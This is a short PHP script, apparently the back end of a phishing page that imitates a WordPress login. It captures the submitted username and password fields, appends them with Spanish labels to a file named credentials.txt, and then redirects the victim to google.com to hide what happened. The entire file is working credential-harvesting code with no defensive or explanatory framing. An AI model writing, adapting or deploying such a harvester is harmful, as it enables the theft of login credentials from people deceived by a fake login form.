<?php

file_put_contents("credentials.txt", "[+] Wordpress -> Usuario: " . $_POST['log'] . " Contraseña: " . $_POST['pwd'] . "\n", FILE_APPEND);
header('Location: https://google.com');
exit();
?>
